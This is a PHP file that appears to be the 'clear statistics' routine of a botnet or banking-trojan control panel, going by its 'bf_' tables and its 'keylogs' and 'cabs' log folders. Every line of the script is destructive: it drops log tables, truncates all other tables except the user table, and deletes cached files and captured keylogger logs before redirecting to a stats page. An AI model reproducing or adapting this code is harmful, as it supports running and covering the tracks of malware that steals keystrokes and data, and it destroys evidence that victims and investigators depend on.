<?php

$db_stats = $mysqli->query("SHOW TABLE STATUS WHERE (Name != 'bf_users') AND (Name NOT LIKE 'bf_logs%')", null, null, false);
$db_dels = $mysqli->query("SHOW TABLE STATUS WHERE (Name LIKE 'bf_logs_%')", null, null, false);

$db_del = '';
foreach($db_dels as $value){
	$db_del .= '`' . $value->Name . '`,';
}
$db_del = rtrim($db_del, ',');

if(!empty($db_del)){
	$mysqli->query('DROP TABLE ' . $db_del . ';');
}

unset($db_dels);
unset($db_del);

$db_clear = '';
foreach($db_stats as $value){	$mysqli->query('TRUNCATE TABLE `' . $value->Name . '`;');
	$db_clear .= '`' . $value->Name . '`,';
}
$db_clear = rtrim($db_clear, ',');

$mysqli->query('REPAIR TABLE ' . $db_clear . ';');
$mysqli->query('OPTIMIZE TABLE ' . $db_clear . ';');

unset($db_stats);
unset($db_clear);

$dir = array();
$dir['country'] = true;
$dir['prefix'] = true;
$dir['sqls'] = true;
$dir['logs'] = true;
$dir['smarty'] = true;
$dir['zips'] = true;
$dir['cabs'] = true;

foreach($dir as $d => $files){
	$files = scandir('cache/'.$d.'/');
	unset($files[0], $files[1]);
	foreach($files as $value){
		@unlink('cache/'.$d.'/' . $value);
	}
}

$dir = array();
$dir['cabs'] = true;
$dir['keylogs'] = true;

foreach($dir as $d => $files){
	$files = scandir('logs/'.$d.'/');
	unset($files[0], $files[1]);
	foreach($files as $value){
		if($value != '.htaccess') @unlink('logs/'.$d.'/' . $value);
	}
}

header('Location: /main/stat.html');
exit;

?>